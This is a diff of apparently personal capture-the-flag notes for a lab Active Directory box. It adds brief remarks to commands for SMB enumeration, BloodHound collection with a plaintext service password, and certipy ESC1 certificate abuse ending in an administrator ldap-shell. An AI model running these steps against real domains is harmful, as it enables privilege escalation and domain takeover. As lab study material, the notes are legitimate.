@@ -505,6 +505,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 [\] Closing connections..                                                                                       [|] Closing connections..                                                                                       [/] Closing connections..                                                                                       [-] Closing connections..                                                                                       [\] Closing connections..                                                                                       [|] Closing connections..                                                                                       [/] Closing connections..                                                                                       [-] Closing connections..                                                                                       [*] Closed 1 connections                                                          
 ```
 
+dead end
 ## Bloodhound enum
 
 ```
@@ -512,6 +513,8 @@ sudo bloodhound-python -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -ns 10.129.229.56 -
 ```
 
 svc_ldap is memeber of remote management users
+
+![](./screens/6.png)
 
 ---
 ## User Flag
@@ -618,12 +621,15 @@ Info: Download successful!
 *Evil-WinRM* PS C:\Certs> 
 
 ```
+(useless)
 
 cert enumeration:
 
 ```
  certipy-ad find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable -stdout
 ```
+
+CorpVPN is vulnerable to ESC1 attacks
 
 ```
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -754,6 +760,8 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 ```
 
+fails:
+
 ```
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56        
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -769,6 +777,8 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [-] See the wiki for more information
 
 ```
+
+using ldap-shell instead:
 
 ```
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56 -ldap-shell
